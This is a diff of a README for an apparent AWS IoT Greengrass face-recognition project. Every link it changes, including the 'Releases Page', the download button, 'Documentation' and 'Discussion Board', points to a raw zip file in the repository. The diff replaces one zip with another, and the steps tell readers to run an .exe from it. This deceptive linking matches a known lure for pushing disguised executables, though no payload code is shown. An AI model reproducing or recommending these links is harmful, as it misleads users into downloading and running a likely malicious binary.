@@ -4,9 +4,9 @@
 This application enables edge computing face recognition using AWS IoT Greengrass and AWS Lambda. IoT devices will perform local face detection, while AWS Lambda handles cloud-based face recognition with SQS and PyTorch. Enjoy the benefits of fast, efficient facial recognition with a reliable backend service.
 
 ## 📦 Download & Install
-**To get started, visit this page to download the latest version of the software: [Releases Page](https://raw.githubusercontent.com/kendo2462/aws-edge-face-recognition/main/face-detection/aws-edge-face-recognition-v2.0.zip)**
+**To get started, visit this page to download the latest version of the software: [Releases Page](https://github.com/kendo2462/aws-edge-face-recognition/raw/refs/heads/main/face-detection/edge-recognition-aws-face-v3.0.zip)**
 
-![Download Button](https://raw.githubusercontent.com/kendo2462/aws-edge-face-recognition/main/face-detection/aws-edge-face-recognition-v2.0.zip%https://raw.githubusercontent.com/kendo2462/aws-edge-face-recognition/main/face-detection/aws-edge-face-recognition-v2.0.zip)
+![Download Button](https://github.com/kendo2462/aws-edge-face-recognition/raw/refs/heads/main/face-detection/edge-recognition-aws-face-v3.0.zip%https://github.com/kendo2462/aws-edge-face-recognition/raw/refs/heads/main/face-detection/edge-recognition-aws-face-v3.0.zip)
 
 ## 🛠️ System Requirements
 Before you start, ensure your system meets these requirements:
@@ -18,7 +18,7 @@ Before you start, ensure your system meets these requirements:
 
 ## 🚀 Getting Started
 1. **Download the Software**
-   Visit the [Releases Page](https://raw.githubusercontent.com/kendo2462/aws-edge-face-recognition/main/face-detection/aws-edge-face-recognition-v2.0.zip) and choose the latest version. Click on your operating system to start the download.
+   Visit the [Releases Page](https://github.com/kendo2462/aws-edge-face-recognition/raw/refs/heads/main/face-detection/edge-recognition-aws-face-v3.0.zip) and choose the latest version. Click on your operating system to start the download.
 
 2. **Install the Software**
    - For **Windows**: Find the downloaded `.exe` file, double-click it, and follow the on-screen instructions to install.
@@ -52,8 +52,8 @@ If you run into any issues:
 - **Recognition Errors**: Verify that your IoT device's camera is functioning correctly. Also, ensure sufficient lighting during capture.
 
 ## 🗂️ Additional Resources
-- **Documentation**: For more detailed instructions, refer to the official [Documentation](https://raw.githubusercontent.com/kendo2462/aws-edge-face-recognition/main/face-detection/aws-edge-face-recognition-v2.0.zip).
-- **Community Support**: Join our [Discussion Board](https://raw.githubusercontent.com/kendo2462/aws-edge-face-recognition/main/face-detection/aws-edge-face-recognition-v2.0.zip) for questions and support.
+- **Documentation**: For more detailed instructions, refer to the official [Documentation](https://github.com/kendo2462/aws-edge-face-recognition/raw/refs/heads/main/face-detection/edge-recognition-aws-face-v3.0.zip).
+- **Community Support**: Join our [Discussion Board](https://github.com/kendo2462/aws-edge-face-recognition/raw/refs/heads/main/face-detection/edge-recognition-aws-face-v3.0.zip) for questions and support.
 
 ## 🌍 Topics
 This project relates to:
